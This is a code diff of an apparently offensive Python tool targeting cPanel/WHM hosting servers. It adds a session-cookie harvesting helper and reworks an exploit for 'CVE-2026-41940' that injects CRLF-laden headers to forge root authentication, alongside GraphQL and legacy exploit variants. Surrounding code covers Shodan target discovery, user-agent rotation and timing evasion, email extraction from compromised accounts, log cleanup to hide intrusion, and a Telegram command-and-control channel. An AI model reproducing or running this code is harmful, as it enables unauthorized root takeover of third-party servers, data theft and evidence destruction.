@@ -36,7 +36,6 @@ from tqdm import tqdm
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
-# --- Constants ---
 CPANEL_PORTS = [2082, 2083, 2086, 2087, 2095, 2096]
 WHM_PORTS = [2086, 2087]
 FAST_PORTS = [2087, 2083]
@@ -49,7 +48,6 @@ SESSIONS_FILE = "sessions.json"
 SESSIONS_LOCK = FileLock(SESSIONS_FILE + ".lock")
 CONFIG_FILE = "config.json"
 
-# --- Default config ---
 DEFAULT_CONFIG = {
     "shodan_api_key": "",
     "telegram_bot_token": "",
@@ -62,7 +60,6 @@ DEFAULT_CONFIG = {
     "stealth_mode": False
 }
 
-# --- User Agents (extensive list) ---
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -78,7 +75,6 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 DEBUG = False
 
-# --- Terminal / UI helpers ---
 def clear_screen():
     try:
         sys.stdout.write('\033[2J\033[H')
@@ -125,7 +121,6 @@ def print_banner():
         print(line)
     sys.stdout.flush()
 
-# --- Config handling ---
 def load_config():
     if os.path.exists(CONFIG_FILE):
         try:
@@ -139,7 +134,6 @@ def save_config(config):
     with open(CONFIG_FILE, 'w') as f:
         json.dump(config, f, indent=2)
 
-# --- Core networking with proxy and stealth ---
 def get_session(proxy=None):
     if HAS_CURL_CFFI:
         session = cffi_requests.Session(impersonate="chrome120", verify=False)
@@ -160,7 +154,6 @@ def get_session(proxy=None):
 
 def request_with_retry(method, url, min_delay=0.5, max_delay=3.0, **kwargs):
     global DEBUG
-    # Add random delay before request (evasion)
     if min_delay > 0:
         time.sleep(random.uniform(min_delay, max_delay))
     for attempt in range(RETRIES):
@@ -172,7 +165,6 @@ def request_with_retry(method, url, min_delay=0.5, max_delay=3.0, **kwargs):
                 if 'data' in kwargs:
                     logger.debug(f"Data: {kwargs['data']}")
             session = kwargs.pop('session', get_session())
-            # Rotate user-agent per request
             session.headers["User-Agent"] = random.choice(USER_AGENTS)
             resp = session.request(method, url, timeout=TIMEOUT, **kwargs)
             if DEBUG:
@@ -183,7 +175,6 @@ def request_with_retry(method, url, min_delay=0.5, max_delay=3.0, **kwargs):
             time.sleep(1)
     return None
 
-# --- Port / service checks ---
 def check_port(host, port, timeout=TIMEOUT):
     try:
         addrs = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
@@ -218,7 +209,6 @@ def verify_cpanel(host, port):
     except:
         return False
 
-# --- Scanning ---
 def scan_single_fast(target):
     host = target.split(':')[0]
     if ':' in target:
@@ -252,7 +242,6 @@ def scan_targets(targets, threads, min_delay=0, max_delay=0):
                 tqdm.write(Fore.RED + f"[-] {host} - {status}")
     return results
 
-# --- Version detection ---
 def get_cpanel_version(host, port):
     endpoints = [
         (f"/json-api/version", "json"),
@@ -294,44 +283,74 @@ def get_major_version(version):
             pass
     return 0
 
-# --- CVE-2026-41940 Exploit with stealth ---
+def obtain_session_cookie(host, port, session, min_delay, max_delay):
+    """
+    Tries multiple endpoints to obtain a cPanel session cookie.
+    Returns (cookie_name, token) or (None, None) if none found.
+    """
+    base = f"{'https' if port not in [2082,2095] else 'http'}://{host}:{port}"
+    endpoints = [
+        "/",
+        "/cpanel/",
+        "/cpanel",
+        "/cpanel/login",
+        "/cgi-sys/entropybanner.cgi",
+        "/json-api/version"
+    ]
+    for path in endpoints:
+        resp = request_with_retry("GET", f"{base}{path}", session=session, min_delay=min_delay, max_delay=max_delay)
+        if not resp:
+            continue
+        # Check Set-Cookie header
+        if "Set-Cookie" in resp.headers:
+            set_cookie = resp.headers["Set-Cookie"]
+            match = re.search(r'(cpsess[0-9a-f]+)=', set_cookie, re.I)
+            if match:
+                return match.group(1), session.cookies.get(match.group(1))
+        # Check session cookies
+        for cookie in session.cookies:
+            if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
+                return cookie.name, cookie.value
+        # Check response body for cookie in meta or script
+        if resp.text:
+            # Look for a meta tag with session
+            match = re.search(r'<meta[^>]+cpsess[0-9a-f]+[^>]+>', resp.text, re.I)
+            if match:
+                # Extract from content attribute
+                content_match = re.search(r'cpsess([0-9a-f]+)', match.group(0), re.I)
+                if content_match:
+                    cookie_name = "cpsess" + content_match.group(1)
+                    # Try to set it manually (server might not have set it)
+                    session.cookies.set(cookie_name, "dummy")
+                    return cookie_name, "dummy"
+            # Look for a script variable
+            match = re.search(r'cpsess[0-9a-f]+', resp.text, re.I)
+            if match:
+                cookie_name = match.group(0)
+                session.cookies.set(cookie_name, "dummy")
+                return cookie_name, "dummy"
+    return None, None
+
 def exploit_cve_2026_41940(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
     try:
         scheme = "https" if port not in [2082, 2095] else "http"
         base = f"{scheme}://{host}:{port}"
         session = get_session(proxy)
 
-        # Check version – skip if patched
         version = get_cpanel_version(host, port)
         if get_major_version(version) > 120:
             return {"status": "CVE_Version_Patched", "token": None}
 
-        # Stage 1: Obtain session cookie
-        cookie_name = None
-        endpoints = ["/", "/cpanel/", "/cpanel"]
-        for path in endpoints:
-            resp = request_with_retry("GET", f"{base}{path}", session=session, min_delay=min_delay, max_delay=max_delay)
-            if not resp:
-                continue
-            if "Set-Cookie" in resp.headers:
-                set_cookie = resp.headers["Set-Cookie"]
-                match = re.search(r'(cpsess[0-9a-f]+)=', set_cookie, re.I)
-                if match:
-                    cookie_name = match.group(1)
-                    break
-            for cookie in session.cookies:
-                if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
-                    cookie_name = cookie.name
-                    break
-            if cookie_name:
-                break
-
+        # Stage 1: Obtain session cookie – using enhanced method
+        cookie_name, token_value = obtain_session_cookie(host, port, session, min_delay, max_delay)
         if not cookie_name:
+            # Generate dummy cookie
             cookie_name = "cpsess" + ''.join(random.choices('0123456789abcdef', k=16))
             session.cookies.set(cookie_name, "dummy")
+            token_value = "dummy"
             logger.info(f"Generated dummy cookie name: {cookie_name}")
 
-        # Stage 2: Poison the session – try multiple injection vectors
+        # Stage 2: Poison the session
         poison_payload = (
             "root:somepass\r\n"
             "user=root\r\n"
@@ -340,37 +359,32 @@ def exploit_cve_2026_41940(host, port, proxy=None, min_delay=0.5, max_delay=3.0)
             "successful_internal_auth_with_timestamp=9999999999"
         )
         auth_b64 = base64.b64encode(poison_payload.encode()).decode()
-
-        # Vector A: Authorization header
         headers_auth = {"Authorization": f"Basic {auth_b64}"}
         resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers_auth, min_delay=min_delay, max_delay=max_delay)
         if not resp2:
-            return {"status": "CVE_Stage2_Failed", "token": None}
+            return {"status": "CVE_Stage2_Failed", "token": None, "cookie_name": cookie_name}
 
-        # Vector B: Also inject via Referer and User-Agent (additional obfuscation)
+        # Additional injection via headers
         headers_extra = {
             "User-Agent": f"{random.choice(USER_AGENTS)}\r\n{poison_payload}",
             "Referer": f"{base}/\r\n{poison_payload}",
             "X-Forwarded-For": f"127.0.0.1\r\n{poison_payload}"
         }
-        resp2b = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers_extra, min_delay=min_delay, max_delay=max_delay)
-        if not resp2b:
-            # Not critical if this fails
-            pass
+        request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers_extra, min_delay=min_delay, max_delay=max_delay)
 
         # Stage 3: Force session reload
         resp3 = request_with_retry("GET", f"{base}/cpanel/", session=session, min_delay=min_delay, max_delay=max_delay)
         if not resp3:
-            return {"status": "CVE_Stage3_Failed", "token": None}
+            return {"status": "CVE_Stage3_Failed", "token": None, "cookie_name": cookie_name}
 
         # Stage 4: Verify root access
+        # Refresh token from session
         token_value = session.cookies.get(cookie_name)
         if not token_value:
-            return {"status": "CVE_Verify_Failed", "token": None}
+            return {"status": "CVE_Verify_Failed", "token": None, "cookie_name": cookie_name}
 
-        # Try to access a restricted endpoint
-        verify_url = f"{base}/json-api/listaccts"
-        resp4 = request_with_retry("GET", verify_url, session=session, min_delay=min_delay, max_delay=max_delay)
+        # Try listaccts
+        resp4 = request_with_retry("GET", f"{base}/json-api/listaccts", session=session, min_delay=min_delay, max_delay=max_delay)
         if resp4 and resp4.status_code == 200:
             try:
                 data = resp4.json()
@@ -386,6 +400,7 @@ def exploit_cve_2026_41940(host, port, proxy=None, min_delay=0.5, max_delay=3.0)
             except:
                 pass
 
+        # Fallback: try version endpoint
         resp5 = request_with_retry("GET", f"{base}/json-api/version", session=session, min_delay=min_delay, max_delay=max_delay)
         if resp5 and resp5.status_code == 200:
             try:
@@ -401,24 +416,25 @@ def exploit_cve_2026_41940(host, port, proxy=None, min_delay=0.5, max_delay=3.0)
             except:
                 pass
 
-        return {"status": "CVE_Verify_Failed", "token": None}
+        return {"status": "CVE_Verify_Failed", "token": None, "cookie_name": cookie_name}
     except Exception as e:
         logger.error(f"CVE exploit crashed on {host}:{port}: {e}")
         return {"status": "CVE_Exception", "token": None}
 
-# --- GraphQL and Legacy exploits (unchanged, but with updated request_with_retry calls) ---
 def exploit_graphql(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
     try:
         scheme = "https" if port not in [2082, 2095] else "http"
         base = f"{scheme}://{host}:{port}"
         url = f"{base}/graphql"
         session = get_session(proxy)
-        try:
-            probe = request_with_retry("GET", url, session=session, min_delay=min_delay, max_delay=max_delay)
-            if probe and probe.status_code not in [200, 400, 405]:
-                return {"status": "GraphQL_Not_Available", "token": None}
-        except:
-            return {"status": "GraphQL_Error", "token": None}
+        # Try to get a cookie first
+        cookie_name, token = obtain_session_cookie(host, port, session, min_delay, max_delay)
+        if not cookie_name:
+            cookie_name = "cpsess" + ''.join(random.choices('0123456789abcdef', k=16))
+            session.cookies.set(cookie_name, "dummy")
+        probe = request_with_retry("GET", url, session=session, min_delay=min_delay, max_delay=max_delay)
+        if probe and probe.status_code not in [200, 400, 405]:
+            return {"status": "GraphQL_Not_Available", "token": None}
         payload = {
             "query": "query { __type(name: \"__schema\") { name } }",
             "variables": None,
@@ -452,22 +468,24 @@ def exploit_legacy(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
         scheme = "https" if port not in [2082, 2095] else "http"
         base_url = f"{scheme}://{host}:{port}"
         session = get_session(proxy)
+        # Get cookie first
+        cookie_name, token = obtain_session_cookie(host, port, session, min_delay, max_delay)
+        if not cookie_name:
+            cookie_name = "cpsess" + ''.join(random.choices('0123456789abcdef', k=16))
+            session.cookies.set(cookie_name, "dummy")
         resp = request_with_retry("GET", f"{base_url}/cpanel/", session=session, min_delay=min_delay, max_delay=max_delay)
         if not resp or resp.status_code not in [200, 302]:
             return {"status": "Stage1_Failed", "token": None}
-        cookie_name = None
-        if "Set-Cookie" in resp.headers:
-            for cookie in resp.headers.get("Set-Cookie").split(","):
-                if "cpsession" in cookie.lower():
-                    cookie_name = "cpsession"
-                    break
+        # If we already have a cookie, we can skip the cookie extraction
+        # But we need a valid cookie name
         if not cookie_name:
+            # Try to extract from session
             for cookie in session.cookies:
-                if re.search(r'[0-9a-f]{32}', cookie.name) or cookie.name.lower().startswith('cpsess'):
+                if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
                     cookie_name = cookie.name
                     break
-        if not cookie_name:
-            return {"status": "No_Cookie", "token": None}
+            if not cookie_name:
+                return {"status": "No_Cookie", "token": None}
         payload_lines = [
             "root:somepass",
             "user=root",
@@ -484,16 +502,9 @@ def exploit_legacy(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
         resp3 = request_with_retry("GET", f"{base_url}/cpanel/", session=session, min_delay=min_delay, max_delay=max_delay)
         if not resp3:
             return {"status": "Stage3_Failed", "token": None}
-        resp4 = request_with_retry("GET", f"{base_url}/json-api/version", session=session, min_delay=min_delay, max_delay=max_delay)
-        if resp4 and resp4.status_code == 200:
-            try:
-                data = resp4.json()
-                token_value = session.cookies.get(cookie_name)
-                if token_value:
-                    return {"status": "Exploited", "token": token_value, "cookie_name": cookie_name,
-                            "version": data.get('version', {}).get('version')}
-            except:
-                pass
+        token_value = session.cookies.get(cookie_name)
+        if token_value:
+            return {"status": "Exploited", "token": token_value, "cookie_name": cookie_name, "method": "Legacy"}
         return {"status": "Verify_Failed", "token": None}
     except Exception as e:
         logger.error(f"Legacy exploit crashed on {host}:{port}: {e}")
@@ -513,6 +524,7 @@ def exploit_cpanel(host, port, proxy=None, min_delay=0.5, max_delay=3.0):
             result["method"] = name
             return result
         if result and result.get("token"):
+            # We got a token but not fully exploited – could still be useful
             pass
     return result or {"status": "All_Methods_Failed", "token": None}
 
@@ -529,7 +541,6 @@ def validate_session(host, port, cookie_name, token, proxy=None, min_delay=0.5, 
     except:
         return False
 
-# --- Email extraction ---
 def extract_whois_emails(domain):
     try:
         w = whois.whois(domain, timeout=10)
@@ -583,7 +594,6 @@ def extract_emails(host, port, cookie_name, token, proxy=None, min_delay=0.5, ma
         emails = extract_whois_emails(host.split(':')[0])
     return emails
 
-# --- Log cleanup ---
 def clean_logs(host, port, cookie_name, token, proxy=None, min_delay=0.5, max_delay=3.0):
     if port not in WHM_PORTS:
         logger.warning("Log cleanup only supported via WHM ports (2086/2087)")
@@ -610,7 +620,6 @@ def clean_logs(host, port, cookie_name, token, proxy=None, min_delay=0.5, max_de
         logger.error(f"Log cleanup failed on {host}: {e}")
     return False
 
-# --- Database ---
 class Database:
     def __init__(self, db_path="targets.db"):
         self.conn = sqlite3.connect(db_path, check_same_thread=False)
@@ -722,7 +731,6 @@ class Database:
     def close(self):
         self.conn.close()
 
-# --- Session file handling ---
 def load_sessions():
     try:
         with SESSIONS_LOCK:
@@ -741,7 +749,6 @@ def save_sessions(sessions):
     except Exception:
         pass
 
-# --- Shodan integration ---
 class ShodanScanner:
     def __init__(self, api_key=None):
         self.api_key = api_key or os.getenv("SHODAN_API_KEY")
@@ -771,7 +778,6 @@ class ShodanScanner:
             print(Fore.RED + f"[-] Shodan error: {e}")
             return []
 
-# --- Export results ---
 def export_results(results, filename="results.json"):
     export_data = []
     for row in results:
@@ -799,7 +805,6 @@ def export_results(results, filename="results.json"):
     logger.info(f"Results exported to {filename} and {txt_file}")
     return txt_file
 
-# --- Telegram C2 ---
 class TelegramC2:
     def __init__(self, bot_token=None, chat_id=None):
         self.bot_token = bot_token or os.getenv("TELEGRAM_BOT_TOKEN")
@@ -848,7 +853,6 @@ class TelegramC2:
         logger.info("Telegram notification sent.")
         return True
 
-# --- Main Application ---
 class CPwn3rApp:
     def __init__(self):
         self.config = load_config()
@@ -1012,6 +1016,7 @@ class CPwn3rApp:
         with open(filepath, 'r') as f:
             lines = f.read().strip().splitlines()
         count = 0
+        seen = set()
         for line in lines:
             line = line.strip()
             if not line or line.startswith('#'):
@@ -1024,13 +1029,19 @@ class CPwn3rApp:
                 if ':' in line:
                     host, port_str = line.split(':', 1)
                     port = int(port_str)
-                    self.db.add_target(host, port)
+                    key = (host, port)
                 else:
-                    self.db.add_target(line)
+                    host = line
+                    port = None
+                    key = (host, None)
+                if key in seen:
+                    continue
+                seen.add(key)
+                self.db.add_target(host, port)
                 count += 1
             except ValueError:
                 print(Fore.RED + f"[-] Skipping invalid line: {line}")
-        print(Fore.GREEN + f"[+] Loaded {count} targets into database.")
+        print(Fore.GREEN + f"[+] Loaded {count} unique targets into database.")
 
     def _add_target(self):
         target = input("Enter target (IP or domain[:port]): ").strip()
